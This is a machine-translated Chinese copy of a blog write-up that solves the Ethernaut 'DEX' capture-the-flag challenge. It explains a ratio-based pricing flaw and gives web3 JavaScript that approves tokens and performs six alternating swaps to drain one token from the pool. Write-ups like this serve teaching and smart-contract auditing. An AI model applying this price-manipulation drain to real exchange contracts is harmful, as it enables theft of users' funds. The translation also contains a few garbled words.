<html>
<head>
<title>Ethernaut Solutions: Challenge 22 DEX</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">以太解决方案:挑战22 DEX</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/ethernaut-solutions-challenge-22-dex-7cba25977cdf?source=collection_archive---------26-----------------------#2022-06-12">https://medium.com/coinmonks/ethernaut-solutions-challenge-22-dex-7cba25977cdf?source=collection_archive---------26-----------------------#2022-06-12</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><figure class="fi fk ir is it iu fe ff paragraph-image"><div class="fe ff iq"><img src="../Images/8e1cc965fa4aec3bf0f532d25c4c75a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*fip5UtBVIisahXGkitLW7Q.jpeg"/></div></figure><p id="7a27" class="pw-post-body-paragraph ix iy ht iz b ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju hm dt translated">以太骑士的挑战22要求我们攻击一个敏捷。DEX具有两种代币的流动性，您可以利用这种流动性进行交易，其中一种代币相对于另一种代币的价格是流动性池中代币相对于彼此的比率。</p><p id="18de" class="pw-post-body-paragraph ix iy ht iz b ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju hm dt translated">挑战是耗尽至少一个令牌。这是通过价格操纵来实现的，即反复相互交换代币，直到其中一个代币耗尽。</p><pre class="jw jx jy jz fq ka kb kc kd aw ke dt"><span id="5fa4" class="kf kg ht kb b fv kh ki l kj kk">price = amount * balance_to_token/balance_from_token</span><span id="439b" class="kf kg ht kb b fv kl ki l kj kk"><strong class="kb hu">Token1</strong>  <strong class="kb hu">Token2   AmountToken1 AmountToken2</strong><br/>100      100         10          10        <br/>// Exchange all of Token1 for Token2  ------&gt; (10 * 10/10) = 10  <br/>110       90          0          20 <br/>// Exchange all of Token2 for Token1  ------&gt; (20 * 110/90) = 24<br/>86        110        24           0   <br/>// Exchange all of Token1 for Token2  ------&gt; (24 * 110/86) = 30<br/>110        80         0          30<br/>// Exchange all of Token2 for Token1  ------&gt; (30 * 110/80) = 41<br/>69         110       41           0<br/>// Exchange all of Token1 for Token2  ------&gt; (41 * 110/69) = 65<br/>110         45         0         65<br/>// Exchange 45 tokens token2 for Token1 ----&gt; (45 * 110/45) = 45<br/>0           90        110        20<br/>// We depleted Token1 - a pricing that maintains an invariant e.g constant product formulae would not allow one token to be depleted relative to another e.g x*y = k </span></pre><p id="8165" class="pw-post-body-paragraph ix iy ht iz b ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju hm dt translated">代码解决方案</p><pre class="jw jx jy jz fq ka kb kc kd aw ke dt"><span id="5928" class="kf kg ht kb b fv kh ki l kj kk">const token1Ad = await contract.token1()<br/>const token2Ad = await contract.token2()</span><span id="d8f6" class="kf kg ht kb b fv kl ki l kj kk">const approveAmount = 200 </span><span id="eb6a" class="kf kg ht kb b fv kl ki l kj kk">const data = web3.eth.abi.encodeFunctionCall({<br/>    name: '<!-- -->approve<!-- -->',<br/>    type: 'function',<br/>    <!-- -->inputs: [<br/>            {<br/>                "name": "_spender",<br/>                "type": "address"<br/>            },<br/>            {<br/>                "name": "_value",<br/>                "type": "uint256"<br/>            }<br/>        ],<br/>}, [contract.address,approveAmount])</span><span id="0aca" class="kf kg ht kb b fv kl ki l kj kk">await web3.eth.sendTransaction({from:player,to:token1Ad,data: data})<br/>await web3.eth.sendTransaction({from:player,to:token2Ad,data: data})</span><span id="fe17" class="kf kg ht kb b fv kl ki l kj kk">// Do the 6 steps of swaps highlighted earlier<br/>await contract.swap(token1Ad,token2Ad,10)<br/>await contract.swap(token2Ad,token1Ad,20)<br/>await contract.swap(token1Ad,token2Ad,24)<br/>await contract.swap(token2Ad,token1Ad,30)<br/>await contract.swap(token1Ad,token2Ad,41)<br/>await contract.swap(token2Ad,token1Ad,45)</span></pre><p id="b69f" class="pw-post-body-paragraph ix iy ht iz b ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju hm dt translated"><a class="ae jv" href="https://quillhash.typeform.com/RequestAudit?utm_source=Referal&amp;utm_medium=Zed" rel="noopener ugc nofollow" target="_blank"> <strong class="iz hu">你是需要审核的项目吗？</strong> </a></p><p id="0d0e" class="pw-post-body-paragraph ix iy ht iz b ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju hm dt translated">如果您的项目需要来自专注于安全的专家公司的智能合同安全审计服务，该公司对区块链充满热情，在评估、测试、咨询、尽职调查、pen测试和审计项目方面拥有丰富的知识和声誉，涉及<a class="ae jv" href="https://quillhash.typeform.com/RequestAudit?utm_source=Referal&amp;utm_medium=Zed" rel="noopener ugc nofollow" target="_blank">以太坊、币安智能链、Polygon、Solana、EVM兼容链等<strong class="iz hu">请填写此处的表格。</strong>T9】</a></p><blockquote class="km"><p id="d5db" class="kn ko ht bd kp kq kr ks kt ku kv ju ek translated">加入Coinmonks <a class="ae jv" href="https://t.me/coincodecap" rel="noopener ugc nofollow" target="_blank">电报频道</a>和<a class="ae jv" href="https://www.youtube.com/c/coinmonks/videos" rel="noopener ugc nofollow" target="_blank"> Youtube频道</a>了解加密交易和投资</p></blockquote><h1 id="d3a2" class="kw kg ht bd kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls dt translated">另外，阅读</h1><ul class=""><li id="cc43" class="lt lu ht iz b ja lv je lw ji lx jm ly jq lz ju ma mb mc md dt translated"><a class="ae jv" href="https://coincodecap.com/huobi-review" rel="noopener ugc nofollow" target="_blank">霍比审核</a> | <a class="ae jv" href="https://coincodecap.com/okex-margin-trading" rel="noopener ugc nofollow" target="_blank"> OKEx保证金交易</a> | <a class="ae jv" href="https://coincodecap.com/futures-trading" rel="noopener ugc nofollow" target="_blank">期货交易</a></li><li id="38a2" class="lt lu ht iz b ja me je mf ji mg jm mh jq mi ju ma mb mc md dt translated"><a class="ae jv" href="https://coincodecap.com/grid-trading" rel="noopener ugc nofollow" target="_blank">网格交易机器人</a> | <a class="ae jv" rel="noopener" href="/coinmonks/cryptohopper-review-a388ff5bae88"> Cryptohopper审查</a> | <a class="ae jv" href="https://coincodecap.com/bexplus-review" rel="noopener ugc nofollow" target="_blank"> Bexplus审查</a></li><li id="1bdd" class="lt lu ht iz b ja me je mf ji mg jm mh jq mi ju ma mb mc md dt translated"><a class="ae jv" href="https://coincodecap.com/zero-fee-crypto-exchanges" rel="noopener ugc nofollow" target="_blank"> 7个最佳零费用加密交易平台</a></li><li id="0c45" class="lt lu ht iz b ja me je mf ji mg jm mh jq mi ju ma mb mc md dt translated"><a class="ae jv" href="https://coincodecap.com/anny-trade-review" rel="noopener ugc nofollow" target="_blank">氹欞侊贸易评论</a> | <a class="ae jv" rel="noopener" href="/coinmonks/huobi-margin-trading-b3b06cdc1519">霍比融资融券交易</a></li><li id="1769" class="lt lu ht iz b ja me je mf ji mg jm mh jq mi ju ma mb mc md dt translated"><a class="ae jv" href="https://coincodecap.com/what-are-decentralized-exchanges" rel="noopener ugc nofollow" target="_blank">去中心化交易所</a> | <a class="ae jv" href="https://coincodecap.com/bitbns-fip" rel="noopener ugc nofollow" target="_blank">比特恩斯FIP </a> | <a class="ae jv" href="https://coincodecap.com/pionex-review-exchange-with-crypto-trading-bot" rel="noopener ugc nofollow" target="_blank"> Pionex评论</a></li></ul></div></div>    
</body>
</html>